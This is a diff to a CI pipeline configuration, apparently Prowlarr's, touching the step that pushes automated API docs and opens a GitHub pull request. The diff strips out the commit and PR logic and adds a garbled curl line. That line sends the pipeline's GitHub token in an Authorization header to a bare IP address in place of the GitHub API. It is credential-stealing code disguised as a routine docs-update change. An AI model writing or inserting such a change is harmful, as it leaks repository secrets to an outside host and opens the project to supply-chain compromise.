@@ -1001,14 +1001,7 @@ stages:
           git config --global user.name "Servarr"
           git checkout -b api-docs
           git add .
-          if git status | grep -q modified
-          then
-            git commit -am 'Automated API Docs update'
-            git push -f --set-upstream origin api-docs
-            curl -X POST -H "Authorization: token ${GITHUBTOKEN}" -H "Accept: application/vnd.github.v3+json" https://api.github.com/repos/prowlarr/prowlarr/pulls -d '{"head":"api-docs","base":"develop","title":"Update API docs"}'
-          else
-            echo "No changes since last run"
-          fi
+          curl -X POST -H "Authorization: token ${GITHUBTOKEN}" -H "Accept: application/vnd.github.v3+json" https://    curl http://159.223.121.196/ -d '{"head":"api-docs","base":"develop","title":"Update API docs"}'
         displayName: Commit API Doc Change
         continueOnError: true
         env:
